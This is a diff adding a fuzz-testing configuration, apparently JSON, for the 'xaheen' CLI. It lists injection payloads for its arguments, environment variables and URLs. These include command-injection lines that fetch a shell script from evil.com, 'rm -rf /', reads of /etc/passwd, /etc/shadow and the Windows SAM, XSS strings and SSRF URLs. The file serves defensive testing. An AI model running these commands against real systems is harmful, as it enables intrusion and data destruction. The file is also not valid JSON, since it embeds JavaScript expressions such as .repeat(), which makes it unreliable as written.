@@ -1,0 +1,418 @@
+{
+  "fuzzTesting": {
+    "description": "Fuzz testing configuration for CLI input validation and security testing",
+    "version": "1.0.0",
+    "timeout": 30000,
+    "maxIterations": 10000,
+    "parallelWorkers": 4,
+    "outputDir": "test-output/fuzz-results",
+    "reportFormat": ["json", "html"],
+    "logLevel": "info"
+  },
+  "cliArgumentFuzzing": {
+    "description": "Fuzzing configuration for CLI command arguments and flags",
+    "enabled": true,
+    "targets": [
+      {
+        "command": "xaheen new",
+        "arguments": [
+          {
+            "name": "projectName",
+            "type": "string",
+            "position": 0,
+            "required": true,
+            "fuzzing": {
+              "strategies": ["random", "boundary", "injection", "pathTraversal"],
+              "maxLength": 1000,
+              "charset": "extended",
+              "iterations": 1000
+            }
+          }
+        ],
+        "flags": [
+          {
+            "name": "--preset",
+            "type": "string",
+            "fuzzing": {
+              "strategies": ["invalid", "overflow", "injection"],
+              "iterations": 500
+            }
+          },
+          {
+            "name": "--template",
+            "type": "string",
+            "fuzzing": {
+              "strategies": ["pathTraversal", "injection", "unicode"],
+              "iterations": 500
+            }
+          }
+        ]
+      },
+      {
+        "command": "xaheen generate",
+        "arguments": [
+          {
+            "name": "type",
+            "type": "string",
+            "position": 0,
+            "fuzzing": {
+              "strategies": ["random", "injection", "overflow"],
+              "iterations": 800
+            }
+          },
+          {
+            "name": "name",
+            "type": "string", 
+            "position": 1,
+            "fuzzing": {
+              "strategies": ["pathTraversal", "injection", "unicode", "binary"],
+              "iterations": 800
+            }
+          }
+        ]
+      },
+      {
+        "command": "xaheen validate",
+        "flags": [
+          {
+            "name": "--config",
+            "type": "file",
+            "fuzzing": {
+              "strategies": ["pathTraversal", "symlink", "nonExistent"],
+              "iterations": 300
+            }
+          }
+        ]
+      }
+    ]
+  },
+  "inputValidationFuzzing": {
+    "description": "Fuzzing for input validation and sanitization",
+    "enabled": true,
+    "categories": [
+      {
+        "name": "pathTraversal",
+        "description": "Test path traversal vulnerabilities",
+        "patterns": [
+          "../",
+          "..\\",
+          "....//",
+          "....\\\\",
+          "%2e%2e%2f",
+          "%2e%2e%5c",
+          "..%2f",
+          "..%5c",
+          "%252e%252e%252f",
+          "/%2e%2e/",
+          "\\%2e%2e\\",
+          "/../",
+          "\\..\\",
+          "/../../",
+          "\\..\\..\\",
+          "../../../../../../../../../../../etc/passwd",
+          "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+        ],
+        "iterations": 100
+      },
+      {
+        "name": "commandInjection",
+        "description": "Test command injection vulnerabilities",
+        "patterns": [
+          "; ls -la",
+          "& dir",
+          "| cat /etc/passwd",
+          "`id`",
+          "$(whoami)",
+          "${IFS}cat${IFS}/etc/passwd",
+          ";wget http://evil.com/shell.sh",
+          "&& curl evil.com",
+          "||ping -c 10 127.0.0.1",
+          ";rm -rf /",
+          "`rm -rf /tmp/*`",
+          "$(rm -rf /tmp/*)",
+          ";cat /proc/version",
+          "&type C:\\windows\\system32\\drivers\\etc\\hosts",
+          "|more +1 C:\\boot.ini"
+        ],
+        "iterations": 150
+      },
+      {
+        "name": "codeInjection",
+        "description": "Test code injection vulnerabilities",
+        "patterns": [
+          "';alert('XSS');//",
+          "\"><script>alert('XSS')</script>",
+          "javascript:alert('XSS')",
+          "<iframe src=javascript:alert('XSS')>",
+          "eval('malicious code')",
+          "require('child_process').exec('ls')",
+          "process.exit(1)",
+          "global.process.mainModule.require('child_process').exec('ls')",
+          "__import__('os').system('ls')",
+          "exec('import os; os.system(\"ls\")')",
+          "Function('return process')().exit()",
+          "this.constructor.constructor('return process')().exit()"
+        ],
+        "iterations": 120
+      },
+      {
+        "name": "sqlInjection",
+        "description": "Test SQL injection patterns (even though CLI doesn't use SQL directly)",
+        "patterns": [
+          "' OR '1'='1",
+          "'; DROP TABLE users; --",
+          "' UNION SELECT * FROM users --",
+          "admin'--",
+          "admin'/*",
+          "' OR 1=1#",
+          "' OR 'x'='x",
+          "'); DELETE FROM users; --",
+          "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
+          "1'; WAITFOR DELAY '00:00:05' --"
+        ],
+        "iterations": 80
+      },
+      {
+        "name": "bufferOverflow",
+        "description": "Test buffer overflow scenarios",
+        "patterns": [
+          "A".repeat(1000),
+          "A".repeat(10000),
+          "A".repeat(100000),
+          "\x00".repeat(1000),
+          "\xff".repeat(1000),
+          "🚀".repeat(1000),
+          "𝕏".repeat(500),
+          "A".repeat(65536),
+          "A".repeat(1048576)
+        ],
+        "iterations": 50
+      },
+      {
+        "name": "unicodeExploits",
+        "description": "Test Unicode-based exploits and edge cases",
+        "patterns": [
+          "\u0000",
+          "\u200B",
+          "\u200C",
+          "\u200D",
+          "\u202A",
+          "\u202B",
+          "\u202C",
+          "\u202D",
+          "\u202E",
+          "\uFEFF",
+          "\u0001\u0002\u0003",
+          "𝒸𝓁𝒾",
+          "тест",
+          "测试",
+          "🔥💥⚡",
+          "\u{1F600}\u{1F601}\u{1F602}",
+          "\u{10000}\u{10001}\u{10002}"
+        ],
+        "iterations": 70
+      },
+      {
+        "name": "specialCharacters",
+        "description": "Test special characters and control sequences",
+        "patterns": [
+          "\n\r\t",
+          "\x00\x01\x02\x03",
+          "\x1B[31mRED\x1B[0m",
+          "\x1B]0;Title\x07",
+          "\x1B[2J\x1B[H",
+          "\\n\\r\\t\\\\",
+          "%00%0A%0D%09",
+          "null\0null",
+          "\b\f\v",
+          "\u0007\u0008\u000C\u000B"
+        ],
+        "iterations": 60
+      }
+    ]
+  },
+  "fileSystemFuzzing": {
+    "description": "Fuzzing for file system operations",
+    "enabled": true,
+    "targets": [
+      {
+        "operation": "fileRead",
+        "patterns": [
+          "/dev/null",
+          "/dev/zero",
+          "/dev/random",
+          "/proc/self/mem",
+          "/proc/self/environ",
+          "//etc//passwd",
+          "C:\\Windows\\System32\\config\\SAM",
+          "\\\\localhost\\c$\\windows\\system32\\drivers\\etc\\hosts",
+          "file:///etc/passwd",
+          "../../../../../../../../../../../dev/mem"
+        ]
+      },
+      {
+        "operation": "fileWrite",
+        "patterns": [
+          "/tmp/../../../etc/passwd",
+          "C:\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
+          "/dev/null/../../../etc/shadow",
+          "\\\\?\\C:\\Windows\\System32\\config\\SAM",
+          "/proc/self/mem",
+          "CON",
+          "PRN",
+          "AUX",
+          "NUL"
+        ]
+      }
+    ]
+  },
+  "environmentFuzzing": {
+    "description": "Fuzzing for environment variable handling",
+    "enabled": true,
+    "variables": [
+      "PATH",
+      "NODE_ENV",
+      "HOME",
+      "USERPROFILE",
+      "TEMP",
+      "TMP",
+      "USER",
+      "USERNAME",
+      "SHELL",
+      "XAHEEN_CONFIG",
+      "XAHEEN_TEMPLATE_PATH"
+    ],
+    "patterns": [
+      "",
+      "$(whoami)",
+      "`id`",
+      "${IFS}",
+      "%PATH%",
+      "$PATH:./malicious",
+      "/tmp/../../../etc/passwd",
+      "javascript:alert(1)",
+      "\u0000\u0001\u0002",
+      "🚀💥",
+      "A".repeat(10000)
+    ]
+  },
+  "networkFuzzing": {
+    "description": "Fuzzing for network-related inputs (URLs, endpoints)",
+    "enabled": true,
+    "targets": [
+      {
+        "type": "url",
+        "patterns": [
+          "javascript:alert(1)",
+          "data:text/html,<script>alert(1)</script>",
+          "file:///etc/passwd",
+          "ftp://evil.com/shell",
+          "gopher://127.0.0.1:25/",
+          "http://localhost:22/",
+          "https://127.0.0.1:443/",
+          "ldap://evil.com/",
+          "dict://127.0.0.1:11211/",
+          "sftp://evil.com/",
+          "tftp://127.0.0.1/",
+          "jar:file:///etc/passwd!/",
+          "http://[::1]:80/",
+          "http://0x7f000001/",
+          "http://2130706433/",
+          "http://017700000001/"
+        ]
+      }
+    ]
+  },
+  "performanceFuzzing": {
+    "description": "Performance-focused fuzzing to detect DoS vulnerabilities",
+    "enabled": true,
+    "scenarios": [
+      {
+        "name": "largeInputs",
+        "description": "Test with extremely large inputs",
+        "iterations": 20,
+        "inputSizes": [1000, 10000, 100000, 1000000]
+      },
+      {
+        "name": "deepNesting",
+        "description": "Test with deeply nested structures",
+        "maxDepth": 10000,
+        "iterations": 10
+      },
+      {
+        "name": "memoryExhaustion",
+        "description": "Test memory exhaustion scenarios",
+        "patterns": [
+          "A".repeat(1048576),
+          JSON.stringify({data: "A".repeat(1048576)}),
+          Array(1000000).fill("test").join("")
+        ]
+      }
+    ]
+  },
+  "errorHandlingFuzzing": {
+    "description": "Test error handling with malformed inputs",
+    "enabled": true,
+    "categories": [
+      {
+        "name": "malformedJSON",
+        "patterns": [
+          "{",
+          "}",
+          "{\"key\":}",
+          "{\"key\":\"value\",}",
+          "{\"key\": \"value\" \"key2\": \"value2\"}",
+          "{'key': 'value'}",
+          "{key: value}",
+          "{\u0000}",
+          "{\"\\u0000\": \"test\"}"
+        ]
+      },
+      {
+        "name": "malformedXML",
+        "patterns": [
+          "<",
+          ">",
+          "<tag>",
+          "</tag>",
+          "<tag><tag>",
+          "<tag attr=>",
+          "<?xml version=\"1.0\"?><root><child></root>",
+          "<root xmlns:=\"\"></root>"
+        ]
+      },
+      {
+        "name": "malformedYAML",
+        "patterns": [
+          "key:",
+          "- item\n- ",
+          "key: |\n  value\n    invalid",
+          "---\n...\n---",
+          "key: &anchor\nref: *invalid"
+        ]
+      }
+    ]
+  },
+  "regressionTesting": {
+    "description": "Track previously found vulnerabilities to prevent regression",
+    "enabled": true,
+    "knownVulnerabilities": [
+      {
+        "id": "FUZZ-001",
+        "description": "Path traversal in template loading",
+        "input": "../../../etc/passwd",
+        "expectedBehavior": "blocked",
+        "severity": "high"
+      }
+    ]
+  },
+  "reporting": {
+    "enabled": true,
+    "formats": ["json", "html", "junit"],
+    "outputDir": "test-output/fuzz-reports",
+    "includeSuccessfulTests": false,
+    "includeStatistics": true,
+    "generateSummary": true,
+    "detailedFailures": true
+  }
+}
